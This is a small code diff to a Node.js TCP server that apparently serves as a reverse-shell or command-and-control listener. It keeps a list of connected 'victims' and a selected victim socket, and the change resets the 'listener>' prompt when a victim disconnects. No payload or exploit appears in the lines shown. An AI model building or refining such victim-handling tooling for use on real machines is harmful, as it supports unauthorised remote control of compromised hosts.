@@ -140,6 +140,7 @@ net.createServer(function(socket){
         console.log("Disconnect this socket: " + socket.name);
         if (socket === current_socket){
             current_socket = null; // no selected victim.
+            prefix = "listener> ".yellow;
         }
         victims.splice(victims.indexOf(socket), 1);
     });
@@ -148,6 +149,7 @@ net.createServer(function(socket){
     socket.on("end", function(){
         if (socket === current_socket){
             current_socket = null; // no selected victim.
+            prefix = "listener> ".yellow;
         }
         victims.splice(victims.indexOf(socket), 1);
         console.log("Victim " + socket.name + " disconnected.");
